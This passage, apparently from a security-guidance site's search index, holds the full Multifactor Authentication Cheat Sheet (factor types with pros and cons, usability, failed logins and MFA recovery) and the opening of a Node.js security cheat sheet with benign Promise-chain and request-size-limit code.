level of annoyance that MFA causes. However, these types of measures do decrease the security provided by MFA, so need to be risk assessed to find a reasonable balance of security and usability for the application. Remembering the user's browser so they don't need to use MFA every time. This can either be permanent, or for a period of a few days. This needs to be done with more than just a cookie, which could be stolen by an attacker. For example, a cookie matched to the previous IP address the cookie was issued for. Whitelisting corporate IP ranges (or, more strictly, using location as a second factor). This doesn't protect against malicious insiders, or a user's workstation being compromised. Only requiring MFA for sensitive actions, not for the initial login. This will depend heavily on the functionality in the application. Failed Login Attempts \u00b6 When a user enters their password, but fails to authenticate using a second factor, this could mean one of two things: The user has lost their second factor, or doesn't have it available (for example, they don't have their mobile phone, or have no signal). The user's password has been compromised. There are a number of steps that should be taken when this occurs: Prompt the user to try another form of MFA For example, an SMS code rather than using their hardware OTP token. Allow the user to attempt to reset their MFA . Notify the user of the failed login attempt, and encourage them to change their password if they don't recognise it. The notification should include the time, browser and geographic location of the login attempt. This should be displayed next time they login, and optionally emailed to them as well. Resetting MFA \u00b6 One of the biggest challenges with implementing MFA is handling users who forget or lose their second factors. There are many ways this could happen, such as: Re-installing a workstation without backing up digital certificates. Wiping or losing a phone without backing up OTP codes. Changing mobile numbers. In order to prevent users from being locked out of the application, there needs to be a mechanism for them to regain access to their account if they can't use their existing MFA; however it is also crucial that this doesn't provide an attacker with a way to bypass MFA and hijack their account. There is no definitive \"best way\" to do this, and what is appropriate will vary hugely based on the security of the application, and also the level of control over the users. Solutions that work for a corporate application where all the staff know each other are unlikely to be feasible for a publicly available application with thousands of users all over the world. Every recovery method has its own advantages and disadvantages, and these need to be evaluated in the context of the application. Some suggestions of possible methods include: Providing the user with a number of single-use recovery codes when they first setup MFA. Requiring the user to setup multiple types of MFA (such as a digital certificate, OTP core and phone number for SMS), so that they are unlikely to lose access to all of them at once. Posting a one-use recovery code (or new hardware token) to the user. Requiring the user contact the support team and having a rigorous process in place to verify their identity. Requiring another trusted user to vouch for them. Something You Know \u00b6 The most common type of authentication is based on something the users knows - typically a password. The biggest advantage of this factor is that it has very low requirements for both the developers and the end user, as it does not require any special hardware, or integration with other services. Passwords and PINs \u00b6 Passwords and PINs are the most common form of authentication due to the simplicity of implementing them. The Authentication Cheat Sheet has guidance on how to implement a strong password policy, and the Password Storage Cheat Sheet has guidance on how to securely store passwords. Most multifactor authentication systems make use of a password, as well as at least one other factor. It should be noted that PINs, \"secret words\" and other similar type of information are all effectively the same as passwords. Using two different types of passwords does not constitute MFA . Pros \u00b6 Simple and well understood. Native support in every authentication framework. Easy to implement. Cons \u00b6 Users are prone to choosing weak passwords. Passwords are commonly re-used between systems. Susceptible to phishing. Security Questions \u00b6 Security questions require the user to choose (or create) a number of questions that only they will know the answer to. These are effectively the same as passwords, although they are generally considered weaker. The Choosing and Using Security Questions Cheat Sheet contains further guidance on how to implement these securely. Pros \u00b6 Simple and well understood. Cons \u00b6 Questions often have easily guessable answers. Answers to questions can often be obtained from social media or other sources. Questions must be carefully chosen so that users will remember answers years later. Susceptible to phishing. Something You Have \u00b6 The second factor is something that the user possesses. This could be a physical item (such as a hardware token), a digital item (such as a certificate or private key), or based on the ownership of a mobile phone, phone number, or email address (such as SMS or a software token installed on the phone, or an email with a single-use verification code). If properly implemented then this can be significantly more difficult for a remote attacker to compromise; however it also creates an additional administrative burden on the user, as they must keep the authentication factor with them whenever they wish to use it. The requirement to have a second factor can also limit certain types of users' ability to access a service. For example, if a user does not have access to a mobile phone, many types of MFA will not be available for them. Hardware OTP Tokens \u00b6 Physical hardware OTP tokens can be used which generate constantly changing numeric codes, which must be submitted when authentication on the application. Most most well-known of these is the RSA SecureID , which generates a six digit number that changes every 60 seconds. Pros \u00b6 As the tokens are separate physical devices, they are almost impossible for an attacker to compromise remotely. Tokens can be used without requiring the user to have a mobile phone or other device. Cons \u00b6 Deploying physical tokens to users is expensive and complicated. If a user loses their token it could take a significant amount of time to purchase and ship them a new one. Some implementations require a backend server, which can introduce new vulnerabilities as well as a single point of failure. Stolen tokens can be used without a PIN or device unlock code. Susceptible to phishing (although short-lived). Software TOTP Tokens \u00b6 A cheaper and easier alternative to hardware tokens is using software to generate Time-based One Time Password (TOTP) codes. This would typically involve the user installing a TOTP application on their mobile phone, and then scanning a QR code provided by the web application which provides the initial seed. The authenticator app then generates a six digit number every 60 seconds, in much the same way as a hardware token. Most websites use standardised TOTP tokens, allowing the user to install any authenticator app that supports TOTP. However, a small number of applications use their own variants of this (such as Symantec), which requires the users to install a specific app in order to use the service. This should be avoided in favour of a standards-based approach. Pros \u00b6 The absence of physical tokens greatly reduces the cost and administrative overhead of implementing the system. When users lose access to their TOTP app, a new one can be configured without needing to ship a physical token to them. TOTP is widely used, and many users will already have at least one TOTP app installed. As long as the user has a screen lock on their phone, an attacker will be unable to use the code if they steal the phone. Cons \u00b6 TOTP apps are usually installed on mobile devices, which are vulnerable to compromise. The TOTP app may be installed on the same mobile device (or workstation) that is used to authenticate. Users may store the backup seeds insecurely. Not all users have mobile devices to use with TOTP. If the user's mobile device is lost, stolen or out of battery, they will be unable to authenticate. Susceptible to phishing (although short-lived). Hardware U2F Tokens \u00b6 Hardware U2F tokens communicate with the users workstation over USB or NFC, and implement challenge-response based authentication, rather than requiring the user to manually enter the code. This would typically be done by the user pressing a button on the token, or tapping it against their NFC reader. Pros \u00b6 Longer codes can be used, which may provide a higher level of security. Users can simply press a button rather than typing in a code. Resistant to phishing. Cons \u00b6 As with hardware OTP tokens, the use of physical tokens introduces significant costs and administrative overheads. Stolen tokens can be used without a PIN or device unlock code. As the tokens are usually connected to the workstation via USB, users are more likely to forget them. Certificates \u00b6 Digital certificates are files that are stored on the user's device which are automatically provided alongside the user's password when authenticating. The most common type is X.509 certificates (discussed in the Transport Layer Protection Cheat Sheet ), more commonly known as client certificates. Certificates are supported by all major web browsers, and once installed require no further interaction from the user. The certificates should be linked to an individual's user account in order to prevent users from trying to authenticate against other accounts. Pros \u00b6 There is no need to purchase and manage hardware tokens. Once installed, certificates are very simple for users. Certificates can be centrally managed and revoked. Resistant to phishing. Cons \u00b6 Using digital certificates requires backend PKI system. Installing certificates can be difficult for users, particularly in a highly restricted environment. Enterprise proxy servers which perform SSL decryption will prevent he use of certificates. The certificates are stored on the user's workstation, and as such can be stolen if their system is compromised. Smartcards \u00b6 Smartcards are credit-card size cards with a chip containing a digital certificate for the user, which is unlocked with a PIN. They are commonly used for operating system authentication, but are rarely used in web applications. Pros \u00b6 Stolen smartcards cannot be used without the PIN. Smartcards can be used across multiple applications and systems. Resistant to phishing. Cons \u00b6 Managing and distributing smartcards has the same costs and overheads as hardware tokens. Smartcards are not natively supported by modern browsers, so require third party software. Although most business-class laptops have smartcard readers built in, home systems often do not. The use of smartcards requires functioning backend PKI systems. SMS Messages and Phone Calls \u00b6 SMS messages or phone calls can be used to provide users with a single-use code that they must submit as a second factor. Pros \u00b6 Relatively simple to implement. Requires user to link their account to a mobile number. Cons \u00b6 Requires the user to have a mobile device or landline. Require user to have signal to receive the call or message. Calls and SMS messages may cost money to send (need to protect against attackers requesting a large number of messages to exhaust funds. A number of attacks against SMS or mobile numbers have been demonstrated and exploited in the past. SMS messages may be received on the same device the user is authenticating from. Susceptible to phishing. Email \u00b6 Email verification requires that the user enters a code or clicks a link sent to their email address. There is some debate as to whether email constitutes a form of MFA, because if the user does not have MFA configured on their email account, it simply requires knowledge of the user's email password (which is often the same as their application password). However, it is included here for completeness. Pros \u00b6 Very easy to implement. No requirements for separate hardware or a mobile device. Cons \u00b6 Relies entirely on the security of the email account, which often lacks MFA. Email passwords are commonly the same as application passwords. Provides no protection if the user's email is compromised first. Email may be received by the same device the user is authenticating from. Susceptible to phishing. Something You Are \u00b6 The final factor in the traditional view of MFA is something you are - which is one of the physical attributes of the users (often called biometrics). Biometrics are rarely used in web applications due to the requirement for users to have specific hardware. Biometrics \u00b6 The are a number of common types of biometrics that are used, including: Fingerprint scans Facial recognition Iris scans Handprint scans Pros \u00b6 Well-implemented biometrics are hard to spoof, and require a targeted attack. Cons \u00b6 Require manual enrolment of the user's physical attributes. Custom (sometimes expensive) hardware is often required to read biometrics. Modern browsers do not have native support, so custom client-side software is required. If compromised, biometric data can be difficult to change. Location \u00b6 The use of location as a fourth factor for MFA is not fully accepted; however, it is increasingly be used for authentication. It is sometimes argued that location is used when deciding whether or not to require MFA (as discussed above ) however this is effectively the same as considering it to be a factor in its own right. Two prominent examples of this are the Conditional Access Policies available in Microsoft Azure, and the Network Unlock functionality in BitLocker. When talking about location, access to the application that the user is authenticating against is not usually considered (as this would always be the case, and as such is relatively meaningless). Source IP Ranges \u00b6 The source IP address the user is connecting from can be used as a factor, typically in a white-list based approach. This could either be based on a static white-list (such as corporate office ranges) or a dynamic white-list (such as previous IP addresses the user has authenticated from). Pros \u00b6 Very easy for users. Requires minimal configuration and management from administrative staff. Cons \u00b6 Doesn't provide any protection if the user's system is compromised. Doesn't provide any protection against rogue insiders. Trusted IP addresses must be carefully restricted (for example, if the open guest Wi-Fi uses the main corporate IP range). Geolocation \u00b6 Rather than using the exact IP address of the user, the geographic location that the IP address is registered to can be used. This is less precise, but may be more feasible to implement in environments where IP addresses are not static. A common usage would be to require additional authentication factors when an authentication attempt is made from outside of the user's normal country. Pros \u00b6 Very easy for users Cons \u00b6 Doesn't provide any protection if the user's system is compromised. Doesn't provide any protection against rogue insiders. Easy for an attacker to bypass by obtaining IP addresses in the trusted country or location.","title":"Multifactor Authentication"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#multifactor-authentication-cheat-sheet","text":"","title":"Multifactor Authentication Cheat Sheet"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#introduction","text":"Multifactor authentication (MFA), or Two-Factor Authentication (2FA) is when a user is required to present more than one type of evidence in order to authenticate on a system. There are four different types of evidence (or factors) that can be used, listed in the table below: Factor Examples Something You Know Passwords, PINs and security questions. Something You Have Hardware or software tokens, certificates, email, SMS and phone calls. Something You Are Fingerprints, facial recognition, iris scans and handprint scans. Location Source IP ranges and geolocation It should be emphasised that while requiring multiple examples of a single factor (such as needing both a password and a PIN) does not constitute MFA , although it may provide some security benefits over a simple password. Additionally, while the following sections discuss the disadvantage and weaknesses of various different types of MFA, in many cases these are only relevant against targeted attacks. Any MFA is better than no MFA .","title":"Introduction"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#advantages","text":"The most common way that user accounts get compromised on applications is through weak, re-used or stolen passwords. Despite any technical security controls implemented on the application, users are liable to choose weak passwords, or to use the same password on different applications. As developers or system administrators, it should be assumed that users' passwords will be compromised as some point, and the system should be designed in order to defend against this. Multi-factor authentication (MFA) is by far the best defense against the majority of password-related attacks, including brute-force, credential stuffing and password spraying, with analysis by Microsoft suggesting that it would have stopped 99.9% of account compromises .","title":"Advantages"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#disadvantages","text":"The biggest disadvantage of MFA is the increase in management complexity for both administrators and end users. Many less technical users may find it difficult to configure and use MFA. Additionally, there are a number of other common issues encountered: Types of MFA that require users to have specific hardware can introduce significant costs and administrative overheads. Users may become locked out of their accounts if they lose or are unable to use their other factors. MFA introduces additional complexity into the application. Many MFA solutions add external dependencies to systems, which can introduce security vulnerabilities or single points of failure. Processes implemented to allow users to bypass or reset MFA may be exploitable by attackers. Requiring MFA may prevent some users from accessing the application.","title":"Disadvantages"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#quick-recommendations","text":"Exactly when and how MFA is implemented in an application will vary on a number of different factors, including the threat model of the application, the technical level of the users, and the level of administrative control over the users. These need to be considered on a per-application basis. However, the following recommendations are generally appropriate for most applications, and provide an initial starting point to consider. Provide the option for users to enable MFA on their accounts using TOTP . Require MFA for administrative or other high privileged users. Consider whitelisting corporate IP ranges so that MFA is not required from them. Allow the user to remember the use of MFA in their browser, so they are not prompted every time they login. Implement a secure process to allow users to reset their MFA.","title":"Quick Recommendations"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#implementing-mfa","text":"","title":"Implementing MFA"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#when-to-require-mfa","text":"The most important place to require MFA on an application is when the user logs in. However, depending on the functionality available, it may also be appropriate to require MFA for performing sensitive actions, such as: Changing passwords or security questions. Changing the email address associated with the account. Disabling MFA. Elevating a user session to an administrative session. If the application provides multiple ways for a user to authenticate these should all require MFA, or have other protections implemented. A common area that is missed is if the application provides a separate API that can be used to login, or has an associated mobile application.","title":"When to Require MFA"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#improving-usability","text":"Having to frequently login with MFA creates an additional burden for users, and may cause them to disable MFA on the application. A number of mechanisms can be used to try and reduce the level of annoyance that MFA causes. However, these types of measures do decrease the security provided by MFA, so need to be risk assessed to find a reasonable balance of security and usability for the application. Remembering the user's browser so they don't need to use MFA every time. This can either be permanent, or for a period of a few days. This needs to be done with more than just a cookie, which could be stolen by an attacker. For example, a cookie matched to the previous IP address the cookie was issued for. Whitelisting corporate IP ranges (or, more strictly, using location as a second factor). This doesn't protect against malicious insiders, or a user's workstation being compromised. Only requiring MFA for sensitive actions, not for the initial login. This will depend heavily on the functionality in the application.","title":"Improving Usability"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#failed-login-attempts","text":"When a user enters their password, but fails to authenticate using a second factor, this could mean one of two things: The user has lost their second factor, or doesn't have it available (for example, they don't have their mobile phone, or have no signal). The user's password has been compromised. There are a number of steps that should be taken when this occurs: Prompt the user to try another form of MFA For example, an SMS code rather than using their hardware OTP token. Allow the user to attempt to reset their MFA . Notify the user of the failed login attempt, and encourage them to change their password if they don't recognise it. The notification should include the time, browser and geographic location of the login attempt. This should be displayed next time they login, and optionally emailed to them as well.","title":"Failed Login Attempts"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#resetting-mfa","text":"One of the biggest challenges with implementing MFA is handling users who forget or lose their second factors. There are many ways this could happen, such as: Re-installing a workstation without backing up digital certificates. Wiping or losing a phone without backing up OTP codes. Changing mobile numbers. In order to prevent users from being locked out of the application, there needs to be a mechanism for them to regain access to their account if they can't use their existing MFA; however it is also crucial that this doesn't provide an attacker with a way to bypass MFA and hijack their account. There is no definitive \"best way\" to do this, and what is appropriate will vary hugely based on the security of the application, and also the level of control over the users. Solutions that work for a corporate application where all the staff know each other are unlikely to be feasible for a publicly available application with thousands of users all over the world. Every recovery method has its own advantages and disadvantages, and these need to be evaluated in the context of the application. Some suggestions of possible methods include: Providing the user with a number of single-use recovery codes when they first setup MFA. Requiring the user to setup multiple types of MFA (such as a digital certificate, OTP core and phone number for SMS), so that they are unlikely to lose access to all of them at once. Posting a one-use recovery code (or new hardware token) to the user. Requiring the user contact the support team and having a rigorous process in place to verify their identity. Requiring another trusted user to vouch for them.","title":"Resetting MFA"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#something-you-know","text":"The most common type of authentication is based on something the users knows - typically a password. The biggest advantage of this factor is that it has very low requirements for both the developers and the end user, as it does not require any special hardware, or integration with other services.","title":"Something You Know"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#passwords-and-pins","text":"Passwords and PINs are the most common form of authentication due to the simplicity of implementing them. The Authentication Cheat Sheet has guidance on how to implement a strong password policy, and the Password Storage Cheat Sheet has guidance on how to securely store passwords. Most multifactor authentication systems make use of a password, as well as at least one other factor. It should be noted that PINs, \"secret words\" and other similar type of information are all effectively the same as passwords. Using two different types of passwords does not constitute MFA .","title":"Passwords and PINs"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros","text":"Simple and well understood. Native support in every authentication framework. Easy to implement.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons","text":"Users are prone to choosing weak passwords. Passwords are commonly re-used between systems. Susceptible to phishing.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#security-questions","text":"Security questions require the user to choose (or create) a number of questions that only they will know the answer to. These are effectively the same as passwords, although they are generally considered weaker. The Choosing and Using Security Questions Cheat Sheet contains further guidance on how to implement these securely.","title":"Security Questions"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_1","text":"Simple and well understood.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_1","text":"Questions often have easily guessable answers. Answers to questions can often be obtained from social media or other sources. Questions must be carefully chosen so that users will remember answers years later. Susceptible to phishing.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#something-you-have","text":"The second factor is something that the user possesses. This could be a physical item (such as a hardware token), a digital item (such as a certificate or private key), or based on the ownership of a mobile phone, phone number, or email address (such as SMS or a software token installed on the phone, or an email with a single-use verification code). If properly implemented then this can be significantly more difficult for a remote attacker to compromise; however it also creates an additional administrative burden on the user, as they must keep the authentication factor with them whenever they wish to use it. The requirement to have a second factor can also limit certain types of users' ability to access a service. For example, if a user does not have access to a mobile phone, many types of MFA will not be available for them.","title":"Something You Have"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#hardware-otp-tokens","text":"Physical hardware OTP tokens can be used which generate constantly changing numeric codes, which must be submitted when authentication on the application. Most most well-known of these is the RSA SecureID , which generates a six digit number that changes every 60 seconds.","title":"Hardware OTP Tokens"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_2","text":"As the tokens are separate physical devices, they are almost impossible for an attacker to compromise remotely. Tokens can be used without requiring the user to have a mobile phone or other device.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_2","text":"Deploying physical tokens to users is expensive and complicated. If a user loses their token it could take a significant amount of time to purchase and ship them a new one. Some implementations require a backend server, which can introduce new vulnerabilities as well as a single point of failure. Stolen tokens can be used without a PIN or device unlock code. Susceptible to phishing (although short-lived).","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#software-totp-tokens","text":"A cheaper and easier alternative to hardware tokens is using software to generate Time-based One Time Password (TOTP) codes. This would typically involve the user installing a TOTP application on their mobile phone, and then scanning a QR code provided by the web application which provides the initial seed. The authenticator app then generates a six digit number every 60 seconds, in much the same way as a hardware token. Most websites use standardised TOTP tokens, allowing the user to install any authenticator app that supports TOTP. However, a small number of applications use their own variants of this (such as Symantec), which requires the users to install a specific app in order to use the service. This should be avoided in favour of a standards-based approach.","title":"Software TOTP Tokens"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_3","text":"The absence of physical tokens greatly reduces the cost and administrative overhead of implementing the system. When users lose access to their TOTP app, a new one can be configured without needing to ship a physical token to them. TOTP is widely used, and many users will already have at least one TOTP app installed. As long as the user has a screen lock on their phone, an attacker will be unable to use the code if they steal the phone.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_3","text":"TOTP apps are usually installed on mobile devices, which are vulnerable to compromise. The TOTP app may be installed on the same mobile device (or workstation) that is used to authenticate. Users may store the backup seeds insecurely. Not all users have mobile devices to use with TOTP. If the user's mobile device is lost, stolen or out of battery, they will be unable to authenticate. Susceptible to phishing (although short-lived).","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#hardware-u2f-tokens","text":"Hardware U2F tokens communicate with the users workstation over USB or NFC, and implement challenge-response based authentication, rather than requiring the user to manually enter the code. This would typically be done by the user pressing a button on the token, or tapping it against their NFC reader.","title":"Hardware U2F Tokens"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_4","text":"Longer codes can be used, which may provide a higher level of security. Users can simply press a button rather than typing in a code. Resistant to phishing.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_4","text":"As with hardware OTP tokens, the use of physical tokens introduces significant costs and administrative overheads. Stolen tokens can be used without a PIN or device unlock code. As the tokens are usually connected to the workstation via USB, users are more likely to forget them.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#certificates","text":"Digital certificates are files that are stored on the user's device which are automatically provided alongside the user's password when authenticating. The most common type is X.509 certificates (discussed in the Transport Layer Protection Cheat Sheet ), more commonly known as client certificates. Certificates are supported by all major web browsers, and once installed require no further interaction from the user. The certificates should be linked to an individual's user account in order to prevent users from trying to authenticate against other accounts.","title":"Certificates"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_5","text":"There is no need to purchase and manage hardware tokens. Once installed, certificates are very simple for users. Certificates can be centrally managed and revoked. Resistant to phishing.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_5","text":"Using digital certificates requires backend PKI system. Installing certificates can be difficult for users, particularly in a highly restricted environment. Enterprise proxy servers which perform SSL decryption will prevent he use of certificates. The certificates are stored on the user's workstation, and as such can be stolen if their system is compromised.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#smartcards","text":"Smartcards are credit-card size cards with a chip containing a digital certificate for the user, which is unlocked with a PIN. They are commonly used for operating system authentication, but are rarely used in web applications.","title":"Smartcards"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_6","text":"Stolen smartcards cannot be used without the PIN. Smartcards can be used across multiple applications and systems. Resistant to phishing.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_6","text":"Managing and distributing smartcards has the same costs and overheads as hardware tokens. Smartcards are not natively supported by modern browsers, so require third party software. Although most business-class laptops have smartcard readers built in, home systems often do not. The use of smartcards requires functioning backend PKI systems.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#sms-messages-and-phone-calls","text":"SMS messages or phone calls can be used to provide users with a single-use code that they must submit as a second factor.","title":"SMS Messages and Phone Calls"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_7","text":"Relatively simple to implement. Requires user to link their account to a mobile number.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_7","text":"Requires the user to have a mobile device or landline. Require user to have signal to receive the call or message. Calls and SMS messages may cost money to send (need to protect against attackers requesting a large number of messages to exhaust funds. A number of attacks against SMS or mobile numbers have been demonstrated and exploited in the past. SMS messages may be received on the same device the user is authenticating from. Susceptible to phishing.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#email","text":"Email verification requires that the user enters a code or clicks a link sent to their email address. There is some debate as to whether email constitutes a form of MFA, because if the user does not have MFA configured on their email account, it simply requires knowledge of the user's email password (which is often the same as their application password). However, it is included here for completeness.","title":"Email"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_8","text":"Very easy to implement. No requirements for separate hardware or a mobile device.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_8","text":"Relies entirely on the security of the email account, which often lacks MFA. Email passwords are commonly the same as application passwords. Provides no protection if the user's email is compromised first. Email may be received by the same device the user is authenticating from. Susceptible to phishing.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#something-you-are","text":"The final factor in the traditional view of MFA is something you are - which is one of the physical attributes of the users (often called biometrics). Biometrics are rarely used in web applications due to the requirement for users to have specific hardware.","title":"Something You Are"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#biometrics","text":"The are a number of common types of biometrics that are used, including: Fingerprint scans Facial recognition Iris scans Handprint scans","title":"Biometrics"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_9","text":"Well-implemented biometrics are hard to spoof, and require a targeted attack.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_9","text":"Require manual enrolment of the user's physical attributes. Custom (sometimes expensive) hardware is often required to read biometrics. Modern browsers do not have native support, so custom client-side software is required. If compromised, biometric data can be difficult to change.","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#location","text":"The use of location as a fourth factor for MFA is not fully accepted; however, it is increasingly be used for authentication. It is sometimes argued that location is used when deciding whether or not to require MFA (as discussed above ) however this is effectively the same as considering it to be a factor in its own right. Two prominent examples of this are the Conditional Access Policies available in Microsoft Azure, and the Network Unlock functionality in BitLocker. When talking about location, access to the application that the user is authenticating against is not usually considered (as this would always be the case, and as such is relatively meaningless).","title":"Location"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#source-ip-ranges","text":"The source IP address the user is connecting from can be used as a factor, typically in a white-list based approach. This could either be based on a static white-list (such as corporate office ranges) or a dynamic white-list (such as previous IP addresses the user has authenticated from).","title":"Source IP Ranges"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_10","text":"Very easy for users. Requires minimal configuration and management from administrative staff.","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_10","text":"Doesn't provide any protection if the user's system is compromised. Doesn't provide any protection against rogue insiders. Trusted IP addresses must be carefully restricted (for example, if the open guest Wi-Fi uses the main corporate IP range).","title":"Cons"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#geolocation","text":"Rather than using the exact IP address of the user, the geographic location that the IP address is registered to can be used. This is less precise, but may be more feasible to implement in environments where IP addresses are not static. A common usage would be to require additional authentication factors when an authentication attempt is made from outside of the user's normal country.","title":"Geolocation"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#pros_11","text":"Very easy for users","title":"Pros"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html#cons_11","text":"Doesn't provide any protection if the user's system is compromised. Doesn't provide any protection against rogue insiders. Easy for an attacker to bypass by obtaining IP addresses in the trusted country or location.","title":"Cons"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html","text":"NodeJS security cheat sheet \u00b6 Introduction \u00b6 This cheat sheet lists the things one can use when developing secure Node.js applications. Each item has a brief explanation and solution that is specific to Node.js environment. Context \u00b6 Node.js applications are increasing in number and they are no different from other frameworks and programming languages. Node.js applications are also prone to all kinds of web application vulnerabilities. Objective \u00b6 This cheat sheet aims to provide a list of best practices to follow during development of Node.js applications. Recommendations \u00b6 There are several different recommendations to enhance security of your Node.js applications. There are categorized as: Application Security Error & Exception Handling Server Security Platform Security Application Security \u00b6 Use flat Promise chains \u00b6 Asynchronous callback functions are one of the strongest features of Node.js. However, increasing layers of nesting within callback functions can become a problem. Any multistage process can become nested 10 or more levels deep. This problem is called as Pyramid of Doom or Callback Hell. In such a code, the errors and results get lost within the callback. Promises are a good way to write asynchronous code without getting into nested pyramids. Promises provide top-down execution while being asynchronous by delivering errors and results to next .then function. Another advantage of Promises is the way Promises handle the errors. If an error occurs in a Promise class, it skips over the .then functions and invokes the first .catch function it finds. This way Promises bring a higher assurance of capturing and handling errors. As a principle, you can make all your asynchronous code (apart from emitters) return promises. However, it should be noted that Promise calls can also become a pyramid. In order to completely stay away from callback hells, flat Promise chains should be used. If the module you are using does not support Promises, you can convert base object to a Promise by using Promise.promisifyAll() function. The following code snippet is an example of callback hell. function func1 ( name , callback ) { setTimeout ( function () { // operations }, 500 ); } function func2 ( name , callback ) { setTimeout ( function () { // operations }, 100 ); } function func3 ( name , callback ) { setTimeout ( function () { // operations }, 900 ); } function func4 ( name , callback ) { setTimeout ( function () { // operations }, 3000 ); } func1 ( \"input1\" , function ( err , result1 ){ if ( err ){ // error operations } else { //some operations func2 ( \"input2\" , function ( err , result2 ){ if ( err ){ //error operations } else { //some operations func3 ( \"input3\" , function ( err , result3 ){ if ( err ){ //error operations } else { // some operations func4 ( \"input 4\" , function ( err , result4 ){ if ( err ){ // error operations } else { // some operations } }); } }); } }); } }); Above code can be securely written as follows using flat Promise chain: function func1 ( name , callback ) { setTimeout ( function () { // operations }, 500 ); } function func2 ( name , callback ) { setTimeout ( function () { // operations }, 100 ); } function func3 ( name , callback ) { setTimeout ( function () { // operations }, 900 ); } function func4 ( name , callback ) { setTimeout ( function () { // operations }, 3000 ); } func1 ( \"input1\" ) . then ( function ( result ){ return func2 ( \"input2\" ); }) . then ( function ( result ){ return func3 ( \"input3\" ); }) . then ( function ( result ){ return func4 ( \"input4\" ); }) . catch ( function ( error ) { // error operations }); Set request size limits \u00b6 Buffering and parsing of request bodies can be resource intensive for the server. If there is no limit on the size of requests, attackers can send request with large request bodies so that they can exhaust server memory or fill disk space. However, fixing a request size limit for all requests may not be the correct behavior, since some requests like those for uploading a file to the server have more content to carry on the request body. Also, input with a JSON type is more dangerous than a multipart input, since parsing JSON is a blocking operation. Therefore, you should set request size limits for different content types. You can accomplish this very easily with express middlewares as follows: app . use ( express . urlencoded ({ limit : \"1kb\" })); app . use ( express . json ({ limit : \"1kb\" })); app . use ( express . multipart ({ limit : \"10mb\" })); app . use ( express . limit ( \"5kb\" )); // this will be valid for every other content type However, it should be noted that attackers can change content type of the request and bypass request size limits. Therefore, before processing the request, data contained in the request should be validated against the content type stated in the request headers. If content type validation for each request affects the performance severely, you can only validate specific content types or request larger than a predetermined size. Do not block the event loop \u00b6 Node.js is very different from common application platforms that use threads. Node.js has a single-thread event-driven architecture. By means of this architecture, throughput becomes high and programming model becomes simpler. Node.js is implemented around a non-blocking I/O event loop. With this event loop, there is no waiting on I/O or context switching. The event loop looks for events and dispatches them to handler functions. Because of this, when CPU intensive JavaScript operations are done, the event loop waits for them to finish. This is why such operations are called blocking. To overcome this problem, Node.js allows assigning callbacks to IO-blocked events. This way, the main application is not blocked and callbacks run asynchronously. Therefore, as a general principle, all blocking operations should be done asynchronously so that the event loop is not blocked. Even if you perform blocking operations asynchronously, it is still possible that your application may not serve as expected. This happens if there is a code outside the callback which relies on the code within the callback to 